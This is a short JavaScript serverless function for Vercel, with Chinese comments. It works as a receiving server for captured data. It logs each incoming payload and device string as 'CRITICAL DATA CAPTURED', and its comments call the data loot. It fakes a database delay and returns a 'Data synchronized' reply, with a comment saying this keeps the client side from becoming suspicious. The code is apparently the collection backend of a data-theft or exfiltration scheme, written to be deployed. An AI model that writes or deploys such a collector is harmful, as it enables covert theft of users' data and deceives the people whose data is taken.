// Vercel Serverless Function
export default async function handler(req, res) {
    // 只接受 POST 请求
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { payload, device, timestamp } = req.body;

    // --- 核心：战利品处理区 ---
    // 在 2026 年，你可能需要将数据存入 MongoDB 或 Supabase
    // 这里我们先用最直接的 Log 方式，方便你实时在 Vercel 后台查看
    
    console.log("========================================");
    console.log("🚨 [CRITICAL DATA CAPTURED] 🚨");
    console.log(`⏰ TIME: ${timestamp}`);
    console.log(`📱 DEVICE: ${device}`);
    console.log(`📄 CONTENT: ${payload}`); 
    console.log("========================================");

    // 模拟数据库写入延迟
    await new Promise(resolve => setTimeout(resolve, 500));

    // 返回成功的响应，不要让前端产生怀疑
    return res.status(200).json({
        status: 'success',
        message: 'Data synchronized'
    });
}
